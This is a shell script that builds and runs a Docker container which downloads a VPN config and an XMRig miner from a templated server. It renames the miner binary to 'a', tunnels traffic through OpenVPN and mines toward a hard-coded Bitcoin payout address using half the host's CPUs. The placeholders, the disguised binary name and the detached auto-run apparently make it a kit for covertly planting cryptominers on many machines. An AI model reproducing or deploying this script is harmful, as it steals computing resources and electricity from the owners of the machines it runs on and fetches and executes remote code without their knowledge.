#!/bin/sh
#name="$(date +"%d_%I_%M_%S")"
name="!!__ID__!!"
#cpu="$(grep -c ^processor /proc/cpuinfo)"
cpu=$(($(grep -c ^processor /proc/cpuinfo)/2))
name_cnt="coin"
echo "
FROM ubuntu
WORKDIR /root
RUN apt-get update
RUN apt-get install -y net-tools wget openvpn dnsmasq nano
RUN cd ~
RUN wget !!__URL__!!resource/rdp.ovpn
RUN echo \"nameserver 8.8.8.8\" > /etc/resolv.conf
RUN echo \"\\
service dnsmasq start &&\\
openvpn --config rdp.ovpn --daemon &&\\
wget !!__URL__!!resource/a.tar.gz &&\\
tar -xf a.tar.gz &&\\
cd xmrig-6.15.1 &&\\
mv xmrig a &&\\
./a -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qxt9n2qq8yy2n462atcqejuu63cfdm07aztx5d3.$name -p x\\
\"> de.sh
CMD [\"sh\", \"de.sh\"]
" > Dockerfile
docker build --tag=$name_cnt .
docker run -it -d --cap-add=NET_ADMIN --device /dev/net/tun --cpus="$cpu" $name_cnt